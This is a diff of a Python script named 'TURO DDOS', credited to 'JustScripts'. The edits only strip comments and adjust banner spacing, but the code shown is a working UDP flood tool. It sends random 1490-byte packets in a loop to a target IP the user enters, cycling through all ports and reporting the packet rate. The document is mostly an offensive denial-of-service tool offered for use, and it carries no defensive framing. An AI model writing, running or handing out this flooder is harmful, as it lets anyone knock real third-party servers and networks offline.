@@ -13,14 +13,14 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
+
 
 os.system("clear")
 
-# turo dos logo
+
 print("\033[96m" + "=" * 50)
 print("\033[95m")
 print("████████╗██╗   ██╗██████╗  ██████╗      ██████╗  ██████╗ ███████╗")
@@ -31,7 +31,7 @@ print("   ██║   ╚██████╔╝██║  ██║╚██�
 print("   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ═════╝      ╚═════╝  ╚═════╝ ╚══════╝")
 print("\033[93m" + "─" * 50)
 print("╔══════════════════════════════════════════════════════╗")
-print("║                 T U R O   D D O S                  ║")
+print("║                 T U R O   D D O S                    ║")
 print("║               [Hyper-Speed Edition]                  ║")
 print("╚══════════════════════════════════════════════════════╝")
 print("\033[96m" + "=" * 50 + "\033[0m")
@@ -42,14 +42,14 @@ port = int(input("\033[92m[+] Target Port : \033[0m"))
 
 os.system("clear")
 
-# Attack screen thing
+
 print("\033[91m")
 print("┌────────────────────────────────────────────────────┐")
 print("│                                                    │")
 print("│                                                    │")
 print("│              |made by: JustScripts|                │")
 print("│                                                    │")
-print("│                 TURO DOS ATTACK                   │")
+print("│                 TURO DOS ATTACK                    │")
 print("│                 [Version 2.0]                      │")
 print("│                                                    │")
 print("└────────────────────────────────────────────────────┘")
@@ -58,7 +58,7 @@ print("\033[0m")
 print("\033[93m" + "Initializing Attack Sequence..." + "\033[0m")
 print()
 
-# Turo loading animation
+
 loading_chars = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
 for i in range(24):
     sys.stdout.write(f"\r\033[94m[{loading_chars[i % 8]}] Initializing TURBO Mode... {int((i+1)/24*100)}%\033[0m")
@@ -85,24 +85,24 @@ try:
         sock.sendto(bytes, (ip, port))
         sent += 1
         port += 1
-        
-        # display with different colors based on packet count
+
+
         if sent % 100 == 0:
-            color = "\033[91m"  # red for every 100th packet
+            color = "\033[91m"
         elif sent % 50 == 0:
-            color = "\033[93m"  # yellow for every 50th packet
+            color = "\033[93m"
         else:
-            color = "\033[92m"  # green for others
-            
+            color = "\033[92m"
+
         elapsed = time.time() - start_time
         packets_per_sec = sent / elapsed if elapsed > 0 else 0
-        
+
         print(f"{color}[TURBO] Packets: {sent:,} | Target: {ip}:{port} | Speed: {packets_per_sec:,.0f} pps\033[0m")
-        
+
         if port >= 65534:
             port = 1
             print("\033[94m[+] Port rotation: Resetting to port 1\033[0m")
-            
+
 except KeyboardInterrupt:
     print("\n\n\033[93m" + "✗" * 50)
     print("ATTACK STOPPED BY USER")
